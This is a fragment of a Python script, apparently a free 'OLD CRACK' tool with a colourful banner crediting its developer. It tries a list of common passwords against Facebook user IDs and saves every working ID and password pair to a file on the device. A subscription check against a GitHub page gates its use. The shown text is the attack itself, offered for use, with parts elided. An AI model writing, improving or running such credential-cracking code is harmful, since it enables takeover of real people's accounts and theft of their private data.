...
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━═━━══━═━━══━═━═━═━═━━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  ARSLAN HERE ✅        [-VPN-MH PROXY-] 
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m ARSII KIING           [-THE ARSII-] 
[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD CRACK  😀❣️       [-ARSLAN-HERE-]
[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92FREE TOOL 🌺
[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32V.6\033[1;35m] THE ARSLAN      [-W/C ARSLAN CMAND-]
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━━━══━═━═━══━═━═━═━═━━═""")
#----------------------------[MAIN/DEF]--------------------------------------------------------------------------#
def main():
    user=[]
    ...
    try:
        ...
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            ...
            if "session_key" in rp:
                print(f"\r\r{G}|-ARSLAN OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/ARSLAN-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}|-ARSLAN OK-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/ARSLAN-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/arslansuhail/Arslantrick/tree/main").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
